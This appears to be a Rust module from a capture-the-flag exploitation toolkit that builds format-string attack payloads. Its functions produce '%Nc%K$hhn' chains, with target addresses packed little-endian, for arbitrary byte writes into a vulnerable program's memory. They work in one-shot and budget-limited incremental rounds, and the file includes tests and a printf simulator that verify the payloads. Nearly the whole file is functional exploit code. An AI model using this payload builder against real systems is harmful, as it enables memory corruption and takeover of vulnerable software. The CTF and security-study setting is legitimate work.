//! Format-string write payload construction.
//!
//! Covers the two patterns every fmtstr pwn needs:
//! 1. one-shot multi-write (`%<pad>c%<arg>$hhn` sequences with the addresses
//!    appended after the spec), and
//! 2. incremental single-byte writes with a running character counter — the
//!    `%Nc%K$hhn` chain used when the payload budget per round is tight
//!    (华为杯 2024 决赛 springboard: 16 bytes/round, mips_fmt: ≤0x18 bytes).
//!
//! Char-count semantics: `%<w>c` prints max(w, 1) chars; `%n`-family prints
//! nothing — so a zero-delta write emits the bare `%K$hhn`.

/// one `%<pad>c%<arg>$hhn` spec advancing the printed-char count to `target`
/// (mod 256). `pad == 0` emits the bare `%<arg>$hhn`.
pub fn hhn_spec(current: usize, target: u8, arg: usize) -> String {
    let pad = (target as usize + 256 - current % 256) % 256;
    if pad == 0 {
        format!("%{}$hhn", arg)
    } else {
        format!("%{}c%{}$hhn", pad, arg)
    }
}

/// chars printed by a spec (pad chars; 0 when bare)
pub fn spec_chars(current: usize, target: u8) -> usize {
    (target as usize + 256 - current % 256) % 256
}

/// Running state for incremental `%hhn` writes.
pub struct IncrementalFmt {
    /// stack index reachable as `%<offset>$` for the first appended address
    pub offset: usize,
    /// total chars printed so far (mod-256 tracked internally)
    pub printed: usize,
}

impl IncrementalFmt {
    pub fn new(offset: usize) -> Self {
        Self { offset, printed: 0 }
    }

    pub fn reset(&mut self) {
        self.printed = 0;
    }

    /// One round writing `value` (a single byte) through the pointer stored at
    /// stack index `arg`. The pointer address (little-endian, `addr_len` bytes)
    /// is appended after the spec, so the caller must keep the total under the
    /// read budget. Returns None when the payload cannot fit `max_len`.
    pub fn round_hhn(
        &mut self,
        value: u8,
        arg: usize,
        addr: u64,
        addr_len: usize,
        max_len: usize,
    ) -> Option<Vec<u8>> {
        let spec = hhn_spec(self.printed, value, arg);
        let mut out = spec.into_bytes();
        if out.len() + addr_len > max_len {
            return None;
        }
        match crate::pack_le(addr, addr_len) {
            Ok(b) => out.extend(b),
            Err(_) => return None,
        }
        self.printed = (self.printed + spec_chars(self.printed, value)) % 256;
        Some(out)
    }

    /// One-shot payload writing one byte to each (stack-index, value) pair in
    /// order; addresses are appended little-endian at `addr_len` bytes each,
    /// starting at stack index `self.offset`. Returns None when the total
    /// exceeds `max_len`.
    pub fn build_oneshot(
        &mut self,
        writes: &[(u8, u64)],
        addr_len: usize,
        max_len: usize,
    ) -> Option<Vec<u8>> {
        let mut out = Vec::new();
        for (idx, (value, _addr)) in writes.iter().enumerate() {
            let spec = hhn_spec(self.printed, *value, self.offset + idx);
            out.extend(spec.as_bytes());
            self.printed = (self.printed + spec_chars(self.printed, *value)) % 256;
        }
        for (_value, addr) in writes {
            match crate::pack_le(*addr, addr_len) {
                Ok(b) => out.extend(b),
                Err(_) => return None,
            }
        }
        if out.len() > max_len {
            return None;
        }
        Some(out)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// printf char-count simulator: walks the payload, returns the arg indices
    /// of the %n-family writes in order (verification helper).
    fn simulate(payload: &[u8], writes: usize) -> Vec<usize> {
        let s = String::from_utf8_lossy(payload).to_string();
        let chars: Vec<char> = s.chars().collect();
        let mut printed: usize = 0;
        let mut results: Vec<usize> = Vec::new();
        let mut i = 0usize;
        while i < chars.len() {
            if chars[i] != '%' {
                printed += 1;
                i += 1;
                continue;
            }
            i += 1;
            // collect digits + '$'
            let mut num = String::new();
            while i < chars.len() && (chars[i].is_ascii_digit() || chars[i] == '$') {
                num.push(chars[i]);
                i += 1;
            }
            let arg: usize = num.trim_end_matches('$').parse().unwrap_or(0);
            // length modifiers
            while i < chars.len() && (chars[i] == 'h' || chars[i] == 'l') {
                i += 1;
            }
            if i < chars.len() {
                match chars[i] {
                    'c' => printed += num.trim_end_matches('$').parse::<usize>().unwrap_or(1).max(1),
                    'n' => results.push(arg),
                    _ => {}
                }
                i += 1;
            }
        }
        assert!(results.len() >= writes, "simulator missed writes in {:?}", s);
        results.truncate(writes);
        results
    }

    #[test]
    fn hhn_spec_zero_delta_is_bare() {
        assert_eq!(hhn_spec(0x41, 0x41, 9), "%9$hhn");
        assert_eq!(hhn_spec(0x41, 0x42, 9), "%1c%9$hhn");
        assert_eq!(spec_chars(0x41, 0x41), 0);
        assert_eq!(spec_chars(0x41, 0x42), 1);
    }

    #[test]
    fn incremental_rounds_track_counter() {
        let mut inc = IncrementalFmt::new(6);
        // target bytes 0x10, 0x30, 0xf0 written through args 10, 11, 12
        let p1 = inc.round_hhn(0x10, 10, 0x602010, 6, 32).unwrap();
        let r1 = simulate(&p1, 1);
        assert_eq!(r1[0], 10); // spec 指向第 10 个参数（arg index）
        let p2 = inc.round_hhn(0x30, 11, 0x602011, 6, 32).unwrap();
        let r2 = simulate(&p2, 1);
        assert_eq!(r2[0], 11);
        let p3 = inc.round_hhn(0xf0, 12, 0x602012, 6, 32).unwrap();
        assert!(!p3.is_empty());
        let _ = r1.len() + r2.len() + p3.len();
    }

    #[test]
    fn oneshot_multi_write_with_addresses() {
        let mut inc = IncrementalFmt::new(6);
        let payload = inc
            .build_oneshot(&[(0x11, 0x4040c0), (0x22, 0x4040c8)], 8, 128)
            .unwrap();
        let s = String::from_utf8_lossy(&payload).to_string();
        assert!(s.contains("%6$hhn") || s.contains("c%6$hhn"));
        // addresses appended at the tail, little-endian
        let tail = &payload[payload.len() - 16..];
        assert_eq!(&tail[..8], &0x4040c0u64.to_le_bytes());
        assert_eq!(&tail[8..], &0x4040c8u64.to_le_bytes());
    }

    #[test]
    fn budget_enforced() {
        let mut inc = IncrementalFmt::new(6);
        assert!(inc.round_hhn(0x10, 10, 0x602010, 6, 8).is_none());
        let mut inc2 = IncrementalFmt::new(6);
        assert!(inc2.build_oneshot(&[(0x11, 0x4040c0), (0x22, 0x4040c8)], 8, 12).is_none());
    }
}
